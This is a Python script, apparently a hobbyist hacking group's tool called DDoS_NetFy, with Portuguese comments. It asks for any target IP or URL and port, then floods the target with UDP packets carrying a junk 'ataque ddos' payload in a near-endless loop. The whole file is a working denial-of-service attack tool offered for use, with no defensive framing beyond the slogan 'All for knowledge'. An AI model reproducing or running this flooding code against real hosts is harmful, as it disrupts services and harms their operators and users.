'''
Group NetExploit

"All for knowledge"

'''

# importa todas a bibliotecas
import socket
import time
from colorama import init, Fore, Style
import pyfiglet
import os
import sys

# inicia o colorama
init()

# inicia o socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)

# try para erro
try:
    # cria uma função chamada plataforma e ver qual sistema operacional está sendo usado para poder apagar a tela
    def plataforma():
        if sys.platform == "linux":
            os.system("clear")
        else:
            os.system("cls")
    plataforma()

    # cria uma função chamada logo e dentro da função imprimi o texto DDoS_NetFy bem grande
    def logo():
        texto = "DDoS_NetFy"
        nome = pyfiglet.figlet_format(texto)
        print(nome)
    logo()

    # configura o ip, url e a porta desejada
    ip = input(Fore.BLUE+"digite o ip ou url: "+Style.RESET_ALL)
    port = int(input(Fore.BLUE+"digite a porta: "+Style.RESET_ALL))

    # pede qual mensagem você quer enviar para o ip ou url
    msg = (Fore.RED + "ataque ddos fhyfuhoayyysfyhneruyfcreyuafeyfouahyfggfdgdfgdfgggdgfgfdgfdgfgghfghghghghgyfdyftftyhtfhgdhughghugrtyghhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhtsgggfghfdghfdhgfdhgfdghfdghfdgfdghfdghfdghfdgfdghfdghfdygfdyfdygfdgyfdygfdygfdygfdfdyfdyfdyfdyfdyfdygfgydgyusgfdsuyfgsfyugfdsuygdfsyhfgfhfgdhgdhfghdjgshskhgsyuergyhurrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrg" + Style.RESET_ALL)
    time.sleep(2)
    
    # mensagem para enviar em 4 segundos
    print(Fore.BLUE + "enviando em 4s..." + Style.RESET_ALL)
    time.sleep(4)
    
    # mensagem enviado com sucesso
    print(Fore.BLUE + "enviado com sucesso" + Style.RESET_ALL)
    time.sleep(2)
    
    # loop for de 1 até 10000000000000000
    for i in range(1, 10000000000000000):
        # try para erros
        try:
            # envia a mensagen em bytes
            msg_bytes = msg.encode('utf-8')
            s.sendto(msg_bytes, (ip, port))
            
            # imprimi "mensagem enviada" e o tanto que ela foi enviada e a mensagem que você digitou acima
            print(Fore.CYAN + f"pacotes udp enviados: {i}" + Style.RESET_ALL)

        # fechando o try-except pegando o tipode erro e imprimindo na tela "erro: (tipo do erro)"
        except Exception as e:
            print(Fore.BLUE + f"erro {e}" + Style.RESET_ALL)

# fechando o try-except de la do começo, imprimindo uma mensagem dizendo que a pessoa saiu de forma inadequada
except KeyboardInterrupt:
    print(Fore.RED+"\n \nsaindo..."+Style.RESET_ALL)
    time.sleep(3)

'''

desenvolved by DarkZero
group by NetExploit

DarkZero yes group
'''
